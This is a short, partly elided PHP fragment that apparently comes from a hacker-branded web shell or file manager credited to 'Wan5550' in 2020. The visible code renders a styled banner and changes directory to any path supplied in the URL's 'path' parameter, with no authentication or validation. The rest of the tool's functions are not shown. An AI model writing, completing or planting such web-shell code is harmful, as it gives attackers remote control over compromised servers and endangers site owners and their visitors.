...
<body>';
echo '<div style="color:#ef6c00;margin-top:0;"><h1><center><img src="https://i.ibb.co/YPMKXpX/profile1.png" width="350px" height="300" style="border-radius: 100px; -moz-border-radius: 100px;"><br>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
...
echo '<br><center>&copy; <span id="footer"></span> 2020 Wan5550</center><br>';
echo '</body></html><!-- EOF -->';
?>
